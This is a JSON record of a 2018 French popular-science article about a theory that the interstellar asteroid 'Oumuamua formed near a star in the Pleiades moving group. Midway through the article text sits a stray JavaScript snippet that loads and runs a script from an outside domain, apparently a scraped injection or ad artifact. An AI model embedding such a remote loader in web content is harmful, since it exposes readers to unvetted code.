{"title": "L'asteroide 'Oumuamua pourrait venir des celebres Pleiades", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2018-01-05", "content": "Quelle est donc l'origine de l'etrange asteroide interstellaire 'Oumuamua ? D'ou vient-il ? Selon un astronome, il pourrait s'etre forme autour d'une etoile d'un groupe particulier d'astres associes a l'amas des Pleiades. L'astronome  Fabo Feng , de l'universite anglaise du Hertfordshire, vient de publier sur  arXiv  une theorie interessante concernant l'origine du premier  asteroide interstellaire  decouvert par l'humanite :  'Oumumua . Pour le chercheur, l'objet, qui fonce actuellement a travers le  Systeme solaire  sur une  orbite  hyperbolique, pourrait bien venir d'un groupe mouvant d'etoiles associe aux celebres  Pleiades  et que les Anglo-Saxons designent <<  Local Association >> . L'amas des Pleiades, ou M45, est un  amas ouvert  de quelques milliers d'etoiles appartenant a la  constellation du Taureau  et situe a environ 400  annees-lumiere  de la  Terre . L'age de l'amas est estime a 100 millions d'annees environ. Pour aboutir a cette conclusion, le chercheur a conduit des  simulations numeriques  qui, en quelque sorte, ont retrace les  mouvements  passes de 'Oumumua a partir des parametres orbitaux actuels de l'asteroide sur son orbite. Ces mouvements ont, bien sur, ete affectes par le champ de  gravitation  de la  Voie lactee  et, a plus petites echelles, par ceux des etoiles proches du  Soleil  dans la  Galaxie . L'astronome a ainsi decouvert que l'asteroide serait passe a environ 16 annees-lumiere de 109 etoiles, mais, surtout, que sa  vitesse  etait la plus basse au voisinage de quelques etoiles bien precises faisant partie du groupe mouvant des Pleiades. Deux extraits des simulations numeriques concernant les mouvements de 'Oumuamua. (c) Fabo Feng                               Une erosion spatiale faible, signe d'un age jeune pour 'Oumuamua ? Or, selon Fabo Feng, la vitesse de ' Oumuamua  devait etre la plus basse au debut de son voyage hors de son systeme planetaire d'origine. Cette vitesse devait alors etre tout juste suffisante pour lui faire quitter la sphere de Hill de son  etoile  et ce n'est qu'apres qu'elle a pu augmenter, au voisinage d'etoiles et de  nuages  moleculaires massifs, sous l'effet de leurs champs de gravitation. Il est donc possible de penser que 'Oumuamua est ne quelque part autour d'une etoile des Pleiades.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En outre, contrairement a la plupart des etoiles proches, 'Oumuamua se deplace tres lentement par rapport au mouvement moyen du reste de la Galaxie. Cela suggere qu'il voyage depuis peu de temps a l'echelle de l'evolution de la  Voie lactee  et qu'il n'a pas encore rencontre suffisamment de corps massifs pour acquerir une grande vitesse. Sa  couleur  suggere aussi qu'il n'est age que de quelques centaines de millions d'annees tout au plus, ce qui est coherent avec une origine dans le groupe mouvant des Pleiades. En effet, bien que cela puisse paraitre etonnant, il existe un phenomene d' erosion spatiale  auquel sont soumis les asteroides. Celui-ci est notamment le produit des impacts de  rayons cosmiques  et il fait rougir la surface de certains asteroides d'autant plus que la surface a ete longtemps exposee.  Ce qu'il faut retenir La mecanique celeste permet de predire (jusqu'a un certain point) les mouvements des planetes et des asteroides du Systeme solaire ainsi que ceux des astres associes aux etoiles de la Voie lactee. Elle peut aussi servir a retracer les mouvements des corps dans le passe. Appliquee a l'asteroide interstellaire 'Oumumua, elle suggere que celui-ci est peut-etre ne autour d'une etoile particuliere, associee a l'amas ouvert des Pleiades. Cet amas est jeune, ce qui semble compatible avec un aspect rougeatre, mais pas trop, de 'Oumuamua. Cela indiquerait que ce dernier n'a pas subi une forte erosion spatiale et, donc, qu'il est jeune lui aussi. Cela vous interessera aussi Interview : la Terre menacee par des asteroides ?                       Depuis quelques annees les scientifiques etudient la menace possible des geocroiseurs pour notre Planete. A l'image du scenario de l'extinction des dinosaures, ces asteroides sont-ils une menace pour la vie sur Terre ? Futura-Sciences a interviewe Jean-Pierre Luminet, astrophysicien de renom, afin d'en savoir plus.                                       ", "theme": "sciences"}